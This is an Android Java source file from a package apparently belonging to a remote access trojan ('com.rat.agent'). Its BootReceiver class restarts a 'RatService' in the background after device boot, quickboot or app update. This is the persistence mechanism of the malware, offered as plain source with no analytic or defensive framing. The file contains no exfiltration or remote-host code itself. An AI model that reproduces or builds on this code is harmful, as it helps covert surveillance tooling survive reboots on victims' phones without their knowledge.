package com.rat.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "RatBoot";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            Log.d(TAG, "Boot detected, starting RatService");
            startService(context);
        }
    }

    private void startService(Context ctx) {
        Intent serviceIntent = new Intent(ctx, RatService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            ctx.startForegroundService(serviceIntent);
        } else {
            ctx.startService(serviceIntent);
        }
    }
}
